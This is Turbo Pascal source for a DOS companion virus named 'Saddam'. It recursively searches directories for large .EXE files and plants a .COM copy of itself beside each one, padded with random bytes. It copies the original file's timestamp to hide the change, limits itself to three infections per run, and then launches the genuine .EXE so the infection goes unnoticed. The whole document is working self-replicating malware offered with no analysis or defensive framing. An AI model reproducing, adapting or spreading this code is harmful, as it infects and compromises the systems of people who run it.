Program Saddam;

{$M 10000,0,0}

Uses
  DOS;

 Var
   DriveID          : String [2];
   Buffer           : Array [1..8000] Of Byte;
   Target,Source    : File;
   Infected         : Byte;
   Done             : Word;
   TargetFile       : String;

(*�������������������������������������������������������������������������*)

 Function ExistCom : Boolean;
 Var
   FindCom : SearchRec;
 Begin
 FindFirst ( TargetFile, 39, FindCom );
 ExistCom := DosError = 0;
 End;

(*�������������������������������������������������������������������������*)

  Procedure SearchDir ( Dir2Search : String );
   Var
    S : SearchRec;

  Begin

    If Dir2Search [ Length ( Dir2Search ) ] <> '\' Then
      Dir2Search := Dir2Search + '\';



    FindFirst ( Dir2Search + '*.exe', 39, S );

     While DosError = 0 Do
      Begin

      TargetFile := Copy ( Dir2Search + S.Name,1,
                         Length ( Dir2Search + S.Name ) -3 ) + 'com';

      If ( Copy ( S.Name, Length ( S.Name ) -2,3 ) = 'EXE' ) And
       Not ExistCom And ( Infected < 3 ) And ( S.Size > 25000 ) Then
        Begin
         {$i-}
         Inc ( Infected );
         Assign ( Target, TargetFile  );
         Rewrite ( Target,1 );
         BlockWrite ( Target, Buffer, Done + Random ( 4400 ));
         SetFTime ( Target, S.Time );
         Close ( Target );
         If IoResult = 101 Then
           Begin
           Infected := 3;
           Erase ( Target );
           End;

         {$i+}
         End;

      FindNext ( S );
      End;

    FindFirst ( Dir2Search + '*', Directory, S );

    If S.Name = '.' Then
     Begin
     FindNext ( S );
     FindNext ( S );
     End;

    If ( DosError = 0 ) And
      ( S.Attr And 16 <> 16 ) Then
       FindNext ( S );

    While DosError = 0 Do
     Begin
     If ( S.Attr And 16 = 16 ) And ( Infected < 3 )  Then
      SearchDir ( Dir2Search + S.Name );
     FindNext ( S );
     End;
   End;


(*�������������������������������������������������������������������������*)

 Begin

 DriveID := FExpand ( ParamStr ( 1 ));
 Infected := 0;


 Assign ( Source, ParamStr ( 0 ) );
 Reset ( Source, 1 );
 BlockRead ( Source, Buffer, 5000, Done );
 Close ( Source );

 Randomize;

 SearchDir ( DriveID );

 Exec ( Copy ( ParamStr ( 0 ),1,
   Length ( ParamStr ( 0 )) -3 ) + 'exe', ParamStr ( 1 ) );


 End.
 